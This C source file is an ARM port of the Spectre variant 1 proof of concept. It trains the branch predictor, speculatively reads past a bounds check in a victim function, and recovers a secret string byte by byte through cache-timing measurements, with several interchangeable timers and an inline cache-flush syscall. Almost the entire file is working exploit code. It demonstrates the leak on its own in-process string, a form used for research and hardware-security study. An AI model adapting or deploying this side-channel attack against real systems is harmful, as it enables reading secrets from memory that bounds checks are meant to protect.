/* Spectre for ARM, without rdtscp and _mm_clflush
   This is a compilation of

   spectre:
   https://spectreattack.com/spectre.pdf
   
   AArch64:
   https://github.com/V-E-O/PoC/tree/master/CVE-2017-5753

   clearcache:
   https://minghuasweblog.wordpress.com/2013/03/29/arm-cache-flush-on-mmapd-buffers-with-clear-cache/

   timer thread:
   https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6
   https://gist.github.com/Eugnis/3ba3f048988e7be76737ab87da64bb26

   perf event:
   https://www.blackhat.com/docs/eu-16/materials/eu-16-Lipp-ARMageddon-How-Your-Smartphone-CPU-Breaks-Software-Level-Security-And-Privacy-wp.pdf

   register:
   https://github.com/IAIK/armageddon
*/

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>

#ifdef TIMING_PTHREAD
#include <pthread.h>
#include <unistd.h>
#endif

#ifdef TIMING_PERFEVENT
#include <linux/perf_event.h>
#include <sys/syscall.h>
#include <assert.h>
#include <unistd.h>
#include <asm/unistd.h>
#endif

#ifdef TIMING_POSIX
#include <time.h>
#endif

#ifdef TIMING_LIBFLUSH
#include <libflush.h>
libflush_session_t* libflush_session;
#endif

int MAX_TRIES = 999;
unsigned int CACHE_HIT_THRESHOLD = 80;

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char* secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

void victim_function(size_t x)
{
	if (x < array1_size)
	{
		temp &= array2[array1[x] * 512];
	}
}


/********************************************************************
Analysis code
********************************************************************/
/* Clearing cache without _mm_clflush
  https://minghuasweblog.wordpress.com/2013/03/29/arm-cache-flush-on-mmapd-buffers-with-clear-cache/
  Another solution is to directly call: __builtin___clear_cache from unistd.h
*/
void clearcache(char* begin, char *end)
{
  const int syscall = 0xf0002; /* __ARM_NR_cacheflush */
  __asm __volatile (
		    "mov	 r0, %0\n"			
		    "mov	 r1, %1\n"
		    "mov	 r7, %2\n"
		    "mov     r2, #0x0\n"
		    "svc     0x00000000\n"
		    :
		    :	"r" (begin), "r" (end), "r" (syscall)
		    :	"r0", "r1", "r7"
		    );
}


#ifdef TIMING_REGISTER

/* From:
   https://github.com/IAIK/armageddon
   https://www.macs.hw.ac.uk/~hwloidl/Courses/F28HS/tutorials_SysPrg_Tut6.pdf
   http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0500g/BIIBDHAF.html

   "The PMU is a co-processor, called CP15, seperate from the main processor but on the main chip"

   MRC: move from co-processor to register
   MCR: move from register to co-processor
*/
#define ARMV7_PMUSERENR_ENABLE (1 << 0)
#define ARMV7_PMCR_E       (1 << 0) /* Enable all counters */
#define ARMV7_PMCR_P       (1 << 1) /* Reset all counters */
#define ARMV7_PMCR_C       (1 << 2) /* Cycle counter reset */
#define ARMV7_PMCR_D       (1 << 3) /* Cycle counts every 64th cpu cycle */
#define ARMV7_PMCR_X       (1 << 4) /* Export to ETM */

void armv7_pmu_init(void) {
  uint32_t value = 0;

  // configure the PMUSERENR register for user mode access - unfortunately I think this only works in kernel mode!
  printf("Configuring PMUSERENR: probably won't work!\n");
  __asm__ volatile("MCR p15, 0, %0, c9, c14, 0" :: "r"(value));

  printf("[+] PMUSERENR configured\n");

  // configure the PMCR register: E, P, C, X, but no clock divider.

  value |= ARMV7_PMCR_E; // Enable all counters
  value |= ARMV7_PMCR_P; // Reset all counters
  value |= ARMV7_PMCR_C; // Reset cycle counter to zero
  value |= ARMV7_PMCR_X; // Enable export of events

  __asm__ volatile ("MCR p15, 0, %0, c9, c12, 0" :: "r" (value));
  printf("[+] PMCR configured\n");

  // configure the Count Enable Set Register (PMCNTENSET) to enable the Cycle Count Register (PMCCNTR) and PMEVCNTR0 to 5 
  value = 0xff;
  // MCR coproc, opcode1, Rd, CRn, CRm [,opcode2]
  __asm__ volatile ("MCR p15, 0, %0, c9, c12, 1" :: "r" (value));
  printf("[+] PMCNTENSET configured\n");

  // configure the Overflow Status Register (PMOVSR) - same
  __asm__ volatile ("MCR p15, 0, %0, c9, c12, 3" :: "r" (value));
  printf("[+] PMOVSR configured\n");

  // PMCCNTR can be used without any special configuration now
  // reset counters
  __asm__ volatile ("MCR p15, 0, %0, c9, c12, 0\n\t" :: "r" (0x00000017));
  printf("[+] Counters reset\n");
}

uint64_t read_cycles()
{
  uint32_t result = 0;

  // Read PMCCNTR
  __asm__ volatile ("MRC p15, 0, %0, c9, c13, 0" : "=r" (result));

  return result;
}
#endif


#ifdef TIMING_PTHREAD
/*********************************************************
  Version where timing is done by a dedicated thread
********************************************************/

int counter_thread_ended = 0;
uint64_t counter = 0;

void *counter_function(void *x_void_ptr)
{
  printf("[+] Counter thread running...\n");
  
  while (!counter_thread_ended) {
    //printf("Counter = %llu\n", counter);
    counter++;
  }

  printf("[+] Counter thread finished\n");
  return NULL;
  }

#endif 

#ifdef TIMING_PERFEVENT
/*****************************************************
  Version where timing is done via perf_event_open
****************************************************/
uint64_t read_cycles()
{
  static struct perf_event_attr attr;
  static int fd = -1;
  
  attr.type = PERF_TYPE_HARDWARE;
  attr.config = PERF_COUNT_HW_CPU_CYCLES;
  attr.size = sizeof(attr);
  attr.exclude_kernel = 1;
  attr.exclude_hv = 1;
  
  fd = syscall(__NR_perf_event_open, &attr, 0, -1, -1, 0);
  assert(fd >= 0 && "no perf event interface available");
  long long result = 0;

  // check if I need to leave fd open across all reads to the perf interface
  if (read(fd, &result, sizeof(result)) < (ssize_t) sizeof(result)) {
    printf("Read error\n");
    return 0;
  }

  // printf("Cycle count: %llu\n", result); 
  close(fd);
  return (uint64_t)  result;
  }
#endif

#ifdef TIMING_POSIX
#define NANOSECONDS_PER_SECOND 1000000000L
uint64_t read_cycles()
{
  struct timespec tp;
  clockid_t clk_id = CLOCK_REALTIME;

  clock_gettime(clk_id, &tp);
  /*printf("tp.tv_sec : %ld\n", tp.tv_sec); 
    printf("tp.tv_nsec: %ld\n", tp.tv_nsec); */ 
  return (uint64_t)  ((tp.tv_sec * NANOSECONDS_PER_SECOND) + tp.tv_nsec);
}
#endif



#ifdef TIMING_LIBFLUSH
uint64_t read_cycles()
{
  return  libflush_get_timing(libflush_session);
}
#endif

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t* addr;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = MAX_TRIES; tries > 0; tries--)
	{
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
#ifdef TIMING_LIBFLUSH
		  libflush_flush(libflush_session, &array2[i * 512]);
#else		
		  clearcache((char*)&array2[i * 512], (char*)(&array2[i * 512]+1)); /* intrinsic for clflush instruction */
#endif

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)
		{
#ifdef TIMING_LIBFLUSH
		  libflush_flush(libflush_session, &array1_size);
#else		
		  clearcache((char*)&array1_size, (char*)(&array1_size+1));
#endif		  
		  for (volatile int z = 0; z < 100; z++)
		    {
		    } /* Delay (can also mfence) */

		  /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
		  /* Avoid jumps in case those tip off the branch predictor */
		  x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
		  x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
		  x = training_x ^ (x & (malicious_x ^ training_x));

		  /* Call the victim! */
		  victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++)
		{
		  mix_i = ((i * 167) + 13) & 255;
		  addr = &array2[mix_i * 512];
#ifdef TIMING_PTHREAD
		  time1 = counter;
#else		  
		  time1 = read_cycles(); /* READ TIMER */
#endif		  
		  junk = *addr; /* MEMORY ACCESS TO TIME */
#ifdef TIMING_PTHREAD
		  time2 = counter - time1;
#else		  
		  time2 = read_cycles() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
#endif
		  if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size]) {
		    results[mix_i]++; /* cache hit - add +1 to score for this value */
		  }
		}

		/* Locate highest & second-highest */
		j = k = -1;
		for (i = 0; i < 256; i++)
		{
		  if (j < 0 || results[i] >= results[j] ){
		    k = j;
		    j = i;
		  }
		  else if (k < 0 || results[i] >= results[k] ) {
		    k = i;
		  }
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}

	results[0] ^= junk; /* use junk so code above won't get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc, char **argv)
{
	printf("Putting '%s' in memory\n", secret);
	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
	int score[2], len = strlen(secret);
	uint8_t value[2];
	char recovered[len+1];
	char value_normalised[2];
	int i = 0;

	memset(recovered, 0x00, len+1);

#ifdef TIMING_LIBFLUSH
	if (libflush_init(&libflush_session, NULL) == false) {
	  printf("Error: Could not initialize libflush\n");
	  return -1;
	}
#endif

#ifdef TIMING_REGISTER
	armv7_pmu_init();
#endif	

#ifdef TIMING_PTHREAD	
	pthread_t counter_thread;

	printf("Creating counter thread...\n");
	if (pthread_create(&counter_thread, NULL, counter_function, NULL)) {
	  printf("[-] Error creating thread\n");
	  return -1;
	}
	printf("[+] Waiting for thread to start?\n");
	sleep(2);
#endif

	if (argc == 4) {
	  sscanf(argv[1], "%d", &MAX_TRIES);
	  sscanf(argv[2], "%d", &CACHE_HIT_THRESHOLD);
	  sscanf(argv[3], "%d", &len);
	}
	printf("MAX_TRIES=%d CACHE_HIT_THRESHOLD=%d len=%d\n", MAX_TRIES, CACHE_HIT_THRESHOLD, len);
	
	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */


	printf("Reading %d bytes:\n", len);
	while (--len >= 0)
	{
	  printf("Reading at malicious_x = %p ", (void *)malicious_x);
	  readMemoryByte(malicious_x++, value, score);
	  printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
	  
	  value_normalised[0] = (value[0] > 31 && value[0] < 127) ? value[0] : '?';
	  value_normalised[1] = (value[1] > 31 && value[1] < 127) ? value[1] : '?';

	  printf("0x%02X='%c' score=%d ", value[0],
		 (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
	  
	  if (score[1] > 0)
	    printf("(second best: 0x%02X='%c' score=%d)", value[1],
		   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
		   score[1]);

	  if (value_normalised[0] == '?' && value_normalised[1] != '?') {
	    recovered[i] = value_normalised[1];
	  } else {
	    recovered[i] = value_normalised[0];
	  }
	  printf("\n");
	  i++;
	}

	printf("Original secret: %s\n", secret);
	printf("Recovered      : %s\n", recovered);

#ifdef TIMING_LIBFLUSH
	if (libflush_terminate(libflush_session) == false) {
	  printf("Libflush terminate failed\n");
	  return -1;
	}
#endif

#ifdef TIMING_PTHREAD	
	// Exit counter thread
	counter_thread_ended = 1;
	if (pthread_join(counter_thread, NULL)) {
	  printf("[-] Error joining thread\n");
	  return -1;
	}
#endif
	
	return (0);
}
